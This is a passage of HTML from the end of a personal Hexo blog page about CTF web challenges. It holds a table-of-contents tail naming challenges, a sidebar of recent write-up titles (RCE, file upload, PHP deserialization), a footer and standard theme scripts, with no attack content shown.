class="toc-number">1.11.</span> <span class="toc-text">导弹迷踪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81"><span class="toc-number">1.12.</span> <span class="toc-text">flag点击就送</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1zjs"><span class="toc-number">1.13.</span> <span class="toc-text">1zjs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%A9%E8%9B%8B"><span class="toc-number">1.14.</span> <span class="toc-text">彩蛋</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/web/wp/Litctf2023%20(copy)/" title="litctf2023">litctf2023</a><time datetime="2023-05-16T07:51:03.374Z" title="发表于 2023-05-16 15:51:03">2023-05-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/web/rce/rce%E6%80%BB%E7%BB%93-1%20(copy)/" title="rce-1">rce-1</a><time datetime="2023-05-14T12:19:54.709Z" title="发表于 2023-05-14 20:19:54">2023-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93%20(copy)/" title="文件上传总结">文件上传总结</a><time datetime="2023-05-14T08:38:25.067Z" title="发表于 2023-05-14 16:38:25">2023-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ctfshow254-261/" title="ctfshow -反序列化">ctfshow -反序列化</a><time datetime="2023-04-24T12:15:09.302Z" title="发表于 2023-04-24 20:15:09">2023-04-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%20(copy)/" title="php反序列化">php反序列化</a><time datetime="2023-04-24T11:56:20.091Z" title="发表于 2023-04-24 19:56:20">2023-04-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Rose</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
